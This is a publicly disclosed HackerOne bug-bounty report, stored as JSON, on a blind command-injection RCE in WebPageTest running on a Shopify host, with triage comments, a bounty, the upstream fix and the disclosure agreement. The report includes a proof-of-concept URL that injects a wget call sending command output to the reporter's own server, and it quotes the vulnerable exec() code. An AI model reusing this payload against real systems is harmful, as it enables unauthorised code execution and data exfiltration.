{"id":73567,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MzU2Nw==","url":"https://hackerone.com/reports/73567","title":"Attention! Remote Code Execution at http://wpt.ec2.shopify.com/","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-07-02T00:05:27.600Z","submitted_at":"2015-07-02T00:05:27.600Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"prakharprasad","url":"/prakharprasad","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/4Qcsaci6HdNLQCPM7oBdhJYY/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2015-07-16T12:02:44.547Z","bug_reporter_agreed_on_going_public_at":"2015-07-16T12:02:44.204Z","team_member_agreed_on_going_public_at":"2015-07-15T17:40:56.002Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\r\n\r\nI just found a remote code execution bug at http://wpt.ec2.shopify.com/\r\n\r\n**Reproduction**\r\n\r\n1. Open \r\n2. In the text area enter  **$(`sleep 20`)** and hit \"Update List\" \r\n3. The result should come out at around 20 seconds, there-by executing sleep command\r\n\r\nPOC:  http://wpt.ec2.shopify.com/testlog.php?days=1\u0026filter=%24%28%60wget+sandbox.prakharprasad.com%2F%24%28id%29%60%29\r\n\r\nI've attached a video for this RCE bug, in which I had executed **id** command for verification purpose on the server and sent back the result to my Apache logs, as the RCE here is blind.\r\n\r\nRegards,\r\nPrakhar Prasad\r\n\r\n\r\n","vulnerability_information_html":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eI just found a remote code execution bug at \u003ca title=\"http://wpt.ec2.shopify.com/\" href=\"/redirect?url=http%3A%2F%2Fwpt.ec2.shopify.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://wpt.ec2.shopify.com/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eReproduction\u003c/strong\u003e\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eOpen \u003c/li\u003e\n\u003cli\u003eIn the text area enter  \u003cstrong\u003e$(\u003ccode\u003esleep 20\u003c/code\u003e)\u003c/strong\u003e and hit \u0026quot;Update List\u0026quot; \u003c/li\u003e\n\u003cli\u003eThe result should come out at around 20 seconds, there-by executing sleep command\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003ePOC:  \u003ca title=\"http://wpt.ec2.shopify.com/testlog.php?days=1\u0026amp;filter=%24%28%60wget+sandbox.prakharprasad.com%2F%24%28id%29%60%29\" href=\"/redirect?url=http%3A%2F%2Fwpt.ec2.shopify.com%2Ftestlog.php%3Fdays%3D1%26filter%3D%2524%2528%2560wget%2Bsandbox.prakharprasad.com%252F%2524%2528id%2529%2560%2529\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://wpt.ec2.shopify.com/testlog.php?days=1\u0026amp;filter=%24%28%60wget+sandbox.prakharprasad.com%2F%24%28id%29%60%29\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ve attached a video for this RCE bug, in which I had executed \u003cstrong\u003eid\u003c/strong\u003e command for verification purpose on the server and sent back the result to my Apache logs, as the RCE here is blind.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nPrakhar Prasad\u003c/p\u003e\n","bounty_amount":"3000.0","formatted_bounty":"$3,000","weakness":{"id":58,"name":"Command Injection - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":43664,"file_name":"RCE-Shopify.mov","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/043/664/30e28a1356435cee132423691c1c4d5a7ce0ba82/RCE-Shopify.mov?response-content-disposition=attachment%3B%20filename%3D%22RCE-Shopify.mov%22%3B%20filename%2A%3DUTF-8%27%27RCE-Shopify.mov\u0026response-content-type=video%2Fquicktime\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQS4MXLS4F%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T064403Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCdPyDr833HeXJwYpWjpt%2BE8j%2FssC2h5%2FlaE7mZngOMiQIhAIhVLq5AR6H%2BIAtKS0YClrr2gxSJzGl8%2FZmOeT68dbjNKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyLw4q7eiVATMCuJ5oqkQNRnoM2%2F7QfXwU%2Fz3OKzDhPBavarq1CsKnppYIDxpxowNYh40iJGbW36kruwk7Up1vRvNyltjF5q8qwhzaGeQZ%2BiAxZXfxuO%2B2Kcrl44J%2BblDlgfJxT%2FhANHqEJ52YkeCqL%2F8Jog8rViNOOl6oETOov%2FmlWe%2BSn52SY6oPYBRdYu%2BBKeiMV8Z7HXhpAE7juI1J25wS6dso8QH7RSAhNGIs8Y8svP20AF0GCUvT57CvEpTEKNmlMu6qBfLwB6pdnFPVBhYyN%2FfIE4%2FQa2wOG4EtJYFQfTQjLwttTt9CYHJbPWKgJsiqZWwvzgG5RucysYaY1Dvc5h%2B9x16jomi9UPmmxblIqy%2BUz9R8kd2FgetX%2B5J5YRu%2FIt1eM4Pmo0vWG1EERVUZkvMX57A4jS5kp%2F0ojOEF2BB5VpPswd3ts8BMSrW%2BwRyh9hJwmvOT24d%2FVDV1XlH12OfiqXYDHqfINlxhQS6ahBnjyeup6YaEdMK6oUB8ZRQCgIyT6ugHXy7R98squWf9jBVCuea8OVuecORCfgjCE76r%2FBTrqAVa%2BDcEKB0%2FoTap54OIKsextuoDcyV%2B5vaIZrhq52EXThW%2BXIbAp6mSkhzoWUgjsywl0H1o%2FDaG%2BNn3BBVN%2BRn45Quca4CUlobnDZ4s%2FQCgf9Z7bonFsVRNiD0YQAXIATjx%2FHm9NSP5TZgVxAil%2FiJbzMr5CzCPucZqQZHGinQXPFIlAHaN7P8LEs1k%2BYLHWhoCxufAjr4F07sxUlcZob%2BG%2FmA%2B1KCCNdIEo%2B%2BJY954m5YuWhqgrGS3SilW7Zv%2FcvslV9aFtJ6DgZI3AgcMDa3advxrZKKcSBi8tFdkDhjvGZZWiwX118rNoAQ%3D%3D\u0026X-Amz-Signature=387841c91099590a6a8100a8545947d006f3478095ccfb341124ce09bec713f7","file_size":2951852,"type":"video/quicktime"}],"allow_singular_disclosure_at":"2015-08-14T17:40:56.284Z","allow_singular_disclosure_after":-169650187.39094108,"singular_disclosure_allowed":true,"vote_count":20,"voters":["is-","libcontainer","michiel","0xsyndr0me","realtess","r0p3","janmejayaswainofficial","fantam1","b7de13fb79e2483638f04b8","spetr0x","and 10 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":498028,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @prakharprasad,\n\nThank you for this report, our team is investigating.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/prakharprasad\"\u003e@prakharprasad\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for this report, our team is investigating.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-07-02T00:28:33.931Z","updated_at":"2015-07-02T00:28:33.931Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":498029,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Great, thanks! ","markdown_message":"\u003cp\u003eGreat, thanks! \u003c/p\u003e\n","automated_response":false,"created_at":"2015-07-02T00:29:57.349Z","updated_at":"2015-07-02T00:29:57.349Z","actor":{"username":"prakharprasad","cleared":true,"url":"/prakharprasad","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/4Qcsaci6HdNLQCPM7oBdhJYY/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":498030,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We've taken down the vulnerable application for now. We'll investigate the next steps and get back to you.","markdown_message":"\u003cp\u003eWe\u0026#39;ve taken down the vulnerable application for now. We\u0026#39;ll investigate the next steps and get back to you.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-07-02T00:41:55.622Z","updated_at":"2015-07-02T00:41:55.622Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":498041,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Alright, François! ","markdown_message":"\u003cp\u003eAlright, François! \u003c/p\u003e\n","automated_response":false,"created_at":"2015-07-02T01:21:29.244Z","updated_at":"2015-07-02T01:32:51.233Z","actor":{"username":"prakharprasad","cleared":true,"url":"/prakharprasad","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/4Qcsaci6HdNLQCPM7oBdhJYY/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":499251,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @francoischagnon. Apart from taking down the subdomain, what other updates you've at the moment? ","markdown_message":"\u003cp\u003eHey \u003ca href=\"/francoischagnon\"\u003e@francoischagnon\u003c/a\u003e. Apart from taking down the subdomain, what other updates you\u0026#39;ve at the moment? \u003c/p\u003e\n","automated_response":false,"created_at":"2015-07-03T20:39:24.640Z","updated_at":"2015-07-03T20:39:24.640Z","actor":{"username":"prakharprasad","cleared":true,"url":"/prakharprasad","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/4Qcsaci6HdNLQCPM7oBdhJYY/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":505434,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @francoischagnon, any updates here ?","markdown_message":"\u003cp\u003eHey \u003ca href=\"/francoischagnon\"\u003e@francoischagnon\u003c/a\u003e, any updates here ?\u003c/p\u003e\n","automated_response":false,"created_at":"2015-07-10T20:54:09.391Z","updated_at":"2015-07-10T20:54:09.391Z","actor":{"username":"prakharprasad","cleared":true,"url":"/prakharprasad","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/4Qcsaci6HdNLQCPM7oBdhJYY/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":509230,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify. As you noted, this service has been taken offline, so the vulnerability is no longer exploitable","markdown_message":"\u003cp\u003eThanks for helping improve the security of Shopify. As you noted, this service has been taken offline, so the vulnerability is no longer exploitable\u003c/p\u003e\n","automated_response":false,"created_at":"2015-07-14T21:18:03.852Z","updated_at":"2015-07-14T21:18:03.852Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Shopify"}},"bounty_amount":"3000.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"prakharprasad","url":"/prakharprasad"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":509231,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2015-07-14T21:18:24.087Z","updated_at":"2015-07-14T21:18:24.087Z","actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"prakharprasad","url":"/prakharprasad"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":509323,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @prakharprasad ,\n\nI want to add a few more details about this issue. First, I have to mention that the host (wpt.ec2.shopify.com) is not in scope of our bug bounty program. We normally don't reward out of scope issues, but we decided to make an exception due to the severity of the issue, and the fact that it's very trivial to exploit.\n\nThis vulnerability is located in a third party tool called WebPageTest. The source code of this application is open source and available at https://github.com/WPO-Foundation/webpagetest.\n\nAt the time I write this, we have not notified the authors of this application yet, which we intend to do before we make this issue public.\n\nThis application was running in a separate Amazon account, so despite the severity of this issue, other Shopify servers were never put at risk.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/prakharprasad\"\u003e@prakharprasad\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eI want to add a few more details about this issue. First, I have to mention that the host (wpt.ec2.shopify.com) is not in scope of our bug bounty program. We normally don\u0026#39;t reward out of scope issues, but we decided to make an exception due to the severity of the issue, and the fact that it\u0026#39;s very trivial to exploit.\u003c/p\u003e\n\n\u003cp\u003eThis vulnerability is located in a third party tool called WebPageTest. The source code of this application is open source and available at \u003ca title=\"https://github.com/WPO-Foundation/webpagetest\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FWPO-Foundation%2Fwebpagetest\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/WPO-Foundation/webpagetest\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eAt the time I write this, we have not notified the authors of this application yet, which we intend to do before we make this issue public.\u003c/p\u003e\n\n\u003cp\u003eThis application was running in a separate Amazon account, so despite the severity of this issue, other Shopify servers were never put at risk.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-07-14T21:57:34.836Z","updated_at":"2015-07-14T21:57:34.836Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":509424,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @francoischagnon,\n\n\u003e I want to add a few more details about this issue. First, I have to mention that the host (wpt.ec2.shopify.com) is not in scope of our bug bounty program. We normally don't reward out of scope issues, but we decided to make an exception due to the severity of the issue, and the fact that it's very trivial to exploit.\n\n Thanks a lot for making this exception. I really appreciate this.\n\n\u003e This vulnerability is located in a third party tool called WebPageTest. The source code of this application is open source and available at https://github.com/WPO-Foundation/webpagetest.\n\n I am aware of this, in fact the vulnerability itself was discovered by doing a source code review of the file [testlog.php](https://github.com/WPO-Foundation/webpagetest/blob/master/www/testlog.php). The sink is PHP's `exec()` function and taint is `$filter` which takes `$_GET[\"filter\"];` as input.\n\n**Vulnerable Code Snippet:**\n\n``` perl\n$filter    = $_GET[\"filter\"];  # user supplied input\n$filterstr = $filter ? strtolower($filter) : null;\n\n. . .  . . . \n\n$filterstr = trim(escapeshellarg(str_replace(array('\"', \"'\", '\\\\'), '', trim($filterstr))), \"'\\\"\"); # basic filtering\n\n. . .  . . . \n\n $pattern = $filterstr;\n\n. . .  . . . \n\n$command = \"grep -i -F \\\"$pattern\\\" \\\"$fileName\\\"\";\nexec($command, $lines, $result_code); # exec() user supplied input.\n\n```\n\n\u003e At the time I write this, we have not notified the authors of this application yet, which we intend to do before we make this issue public.\n\nThat's alright. I will keep this vulnerability private till there is a patch around. Then we can coordinate on public disclosure. \n\nThanks !","markdown_message":"\u003cp\u003eHey \u003ca href=\"/francoischagnon\"\u003e@francoischagnon\u003c/a\u003e,\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eI want to add a few more details about this issue. First, I have to mention that the host (wpt.ec2.shopify.com) is not in scope of our bug bounty program. We normally don\u0026#39;t reward out of scope issues, but we decided to make an exception due to the severity of the issue, and the fact that it\u0026#39;s very trivial to exploit.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eThanks a lot for making this exception. I really appreciate this.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eThis vulnerability is located in a third party tool called WebPageTest. The source code of this application is open source and available at \u003ca title=\"https://github.com/WPO-Foundation/webpagetest\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FWPO-Foundation%2Fwebpagetest\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/WPO-Foundation/webpagetest\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eI am aware of this, in fact the vulnerability itself was discovered by doing a source code review of the file \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FWPO-Foundation%2Fwebpagetest%2Fblob%2Fmaster%2Fwww%2Ftestlog.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003etestlog.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. The sink is PHP\u0026#39;s \u003ccode\u003eexec()\u003c/code\u003e function and taint is \u003ccode\u003e$filter\u003c/code\u003e which takes \u003ccode\u003e$_GET[\u0026quot;filter\u0026quot;];\u003c/code\u003e as input.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eVulnerable Code Snippet:\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight perl\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$filter\u003c/span\u003e    \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003efilter\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026quot;];\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# user supplied input\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$filterstr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$filter\u003c/span\u003e \u003cspan class=\"p\"\u003e?\u003c/span\u003e \u003cspan class=\"nv\"\u003estrtolower\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$filter\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nv\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"o\"\u003e.\u003c/span\u003e \u003cspan class=\"o\"\u003e.\u003c/span\u003e \u003cspan class=\"o\"\u003e.\u003c/span\u003e  \u003cspan class=\"o\"\u003e.\u003c/span\u003e \u003cspan class=\"o\"\u003e.\u003c/span\u003e \u003cspan class=\"o\"\u003e.\u003c/span\u003e \n\n\u003cspan class=\"nv\"\u003e$filterstr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003etrim\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003eescapeshellarg\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003estr_replace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026#39;,\u003c/span\u003e \u003cspan class=\"p\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026quot;,\u003c/span\u003e \u003cspan class=\"p\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"err\"\u003e\\\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e), \u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e, trim($filterstr))), \u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e\\\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026quot;\u0026quot;);\u003c/span\u003e \u003cspan class=\"c1\"\u003e# basic filtering\u003c/span\u003e\n\n\u003cspan class=\"o\"\u003e.\u003c/span\u003e \u003cspan class=\"o\"\u003e.\u003c/span\u003e \u003cspan class=\"o\"\u003e.\u003c/span\u003e  \u003cspan class=\"o\"\u003e.\u003c/span\u003e \u003cspan class=\"o\"\u003e.\u003c/span\u003e \u003cspan class=\"o\"\u003e.\u003c/span\u003e \n\n \u003cspan class=\"nv\"\u003e$pattern\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$filterstr\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"o\"\u003e.\u003c/span\u003e \u003cspan class=\"o\"\u003e.\u003c/span\u003e \u003cspan class=\"o\"\u003e.\u003c/span\u003e  \u003cspan class=\"o\"\u003e.\u003c/span\u003e \u003cspan class=\"o\"\u003e.\u003c/span\u003e \u003cspan class=\"o\"\u003e.\u003c/span\u003e \n\n\u003cspan class=\"nv\"\u003e$command\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003egrep -i -F \u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"si\"\u003e$pattern\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e \u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"si\"\u003e$fileName\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026quot;;\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eexec\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$command\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$lines\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$result_code\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e# exec() user supplied input.\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp\u003eAt the time I write this, we have not notified the authors of this application yet, which we intend to do before we make this issue public.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eThat\u0026#39;s alright. I will keep this vulnerability private till there is a patch around. Then we can coordinate on public disclosure. \u003c/p\u003e\n\n\u003cp\u003eThanks !\u003c/p\u003e\n","automated_response":false,"created_at":"2015-07-14T22:45:35.340Z","updated_at":"2015-07-14T22:45:35.340Z","actor":{"username":"prakharprasad","cleared":true,"url":"/prakharprasad","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/4Qcsaci6HdNLQCPM7oBdhJYY/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":510321,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@prakharprasad I have added @pmeenan to collaborate on this issue, he is the author of WebPagetest.\n\nHe has pushed a fix for the RCE earlier today: https://github.com/WPO-Foundation/webpagetest/commit/225b429bc6d0f6e19f5f54fde525602132c748bf","markdown_message":"\u003cp\u003e\u003ca href=\"/prakharprasad\"\u003e@prakharprasad\u003c/a\u003e I have added \u003ca href=\"/pmeenan\"\u003e@pmeenan\u003c/a\u003e to collaborate on this issue, he is the author of WebPagetest.\u003c/p\u003e\n\n\u003cp\u003eHe has pushed a fix for the RCE earlier today: \u003ca title=\"https://github.com/WPO-Foundation/webpagetest/commit/225b429bc6d0f6e19f5f54fde525602132c748bf\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FWPO-Foundation%2Fwebpagetest%2Fcommit%2F225b429bc6d0f6e19f5f54fde525602132c748bf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/WPO-Foundation/webpagetest/commit/225b429bc6d0f6e19f5f54fde525602132c748bf\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2015-07-15T17:28:52.292Z","updated_at":"2015-07-15T17:28:52.292Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":510326,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I see.  If this is the final patch for the RCE, then we can go ahead and publicly disclose this issue. If that's fine to both of you. ","markdown_message":"\u003cp\u003eI see.  If this is the final patch for the RCE, then we can go ahead and publicly disclose this issue. If that\u0026#39;s fine to both of you. \u003c/p\u003e\n","automated_response":false,"created_at":"2015-07-15T17:31:46.188Z","updated_at":"2015-07-15T17:31:46.188Z","actor":{"username":"prakharprasad","cleared":true,"url":"/prakharprasad","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/4Qcsaci6HdNLQCPM7oBdhJYY/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":510329,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2015-07-15T17:33:27.116Z","updated_at":"2015-07-15T17:33:27.116Z","actor":{"username":"pmeenan","cleared":false,"url":"/pmeenan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"ha